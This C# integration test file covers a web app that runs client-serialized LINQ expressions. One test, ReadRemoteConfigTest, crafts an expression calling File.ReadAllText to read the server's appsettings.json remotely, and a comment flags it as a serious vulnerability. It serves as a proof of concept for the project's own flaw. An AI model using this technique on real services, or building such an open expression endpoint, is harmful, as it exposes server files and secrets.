﻿using Microsoft.AspNetCore.Mvc.Testing;
using NUnit.Framework;
using Stenn.TestModel.WebApp;
using Stenn.TestModel.Domain.AppService.Tests;
using Stenn.TestModel.Domain.AppService.Tests.Entities;
using FluentAssertions;
using Stenn.TestModel.Domain.Tests;
using Microsoft.EntityFrameworkCore;
using System.Linq.Expressions;
using Stenn.AppData;
using System.Linq.CompilerServices.TypeSystem;

namespace Stenn.TestModel.IntegrationTests
{
    [TestFixture]
    public class AppServiceControllerTests
    {
#if NET6_0
        protected const string DBName = "test-appdata-service_net6";
#elif NET7_0
        protected const string DBName = "test-appdata-service_net7";
#elif NET8_0
        protected const string DBName = "test-appdata-service_net8";
#endif

        protected static string GetConnectionString(string dbName)
        {
            return $@"Data Source=.\SQLEXPRESS;Initial Catalog={dbName};MultipleActiveResultSets=True;Integrated Security=SSPI;Encrypt=False";
        }

        protected readonly CancellationToken TestCancellationToken = CancellationToken.None;

        private readonly WebApplicationFactory<Program> _applicationFactory = new WebApplicationFactory<Program>();

        public HttpClient GetClient() => _applicationFactory.CreateClient();

        private ServiceProvider? ServiceProvider { get; set; }

        [OneTimeSetUp]
        public async Task OneTimeSetUp()
        {
            var serviceCollection = InitServices();

            ServiceProvider = serviceCollection.BuildServiceProvider();

            var dbContext = ServiceProvider.GetRequiredService<TestModelDbContext>();
            await dbContext.Database.EnsureCreatedAsync(TestCancellationToken);
        }

        [OneTimeTearDown]
        public async Task OneTimeTearDown()
        {
            var dbContext = ServiceProvider!.GetRequiredService<TestModelDbContext>();
            await dbContext.Database.EnsureDeletedAsync(TestCancellationToken);
        }

        internal static IServiceCollection InitServices(string dbName = DBName)
        {
            var services = new ServiceCollection();

            var connString = GetConnectionString(dbName);
            services.AddDbContext<TestModelDbContext>(builder =>
            {
                builder.UseSqlServer(connString);
            });

            services.AddTestModelAppDataService(connString);

            return services;
        }

        /// <summary>
        /// Checking if webApp can precess responses
        /// </summary>
        [Test]
        public async Task GetIndexTest()
        {
            var hpptClient = GetClient();
            var response = await hpptClient.GetAsync("/TestService/Hello");
            response.EnsureSuccessStatusCode();
        }

        /// <summary>
        /// AppDataClient builds expression and sends it to webApp. webApp executes expression on TestModelService to get data, serializes data and sends it back to client.
        /// </summary>
        [Test]
        public void PostSerializedExpressionTest()
        {
            var httpClient = GetClient();

            Func<string, byte[]> func = (string s) =>
            {
                var result = httpClient.PostAsync("/TestService/ExecuteSerializedExpression", new StringContent(s)).Result;
                result.EnsureSuccessStatusCode();
                return result.Content.ReadAsByteArrayAsync().Result;
            };

            var appDataClient = new TestModelClient(func);

            var data = appDataClient.Query<TestModelCountry>().Take(5).ToList();

            data.Should().HaveCount(5);
        }

        /// <summary>
        /// We can manually craft Expression to read remote service config. Looks like serious vulnerability
        /// </summary>
        [Test]
        public void ReadRemoteConfigTest()
        {
            var httpClient = GetClient();

            var pathExpression = Expression.Constant(Path.Combine(Directory.GetCurrentDirectory(), "appsettings.json"));
            var ex = Expression.Call(typeof(File), "ReadAllText", null, pathExpression);
            var param = Expression.Parameter(typeof(object), "service");
            Expression<Func<object, string>> le = Expression.Lambda<Func<object, string>>(ex, new ParameterExpression[] { param });

            var response = httpClient.PostAsync("/TestService/ExecuteSerializedExpression", new StringContent(SerializeExpression(le))).Result;
            var bytes = response.Content.ReadAsByteArrayAsync().Result;
            var result = System.Text.Json.JsonSerializer.Deserialize<string>(bytes);
            result.Should().NotBeEmpty();
        }

        private string SerializeExpression(Expression expression)
        {
            var serializer = new ExpressionSerializer();
            var slimExpression = serializer.Lift(expression);
            return serializer.Serialize(slimExpression);
        }
    }
}
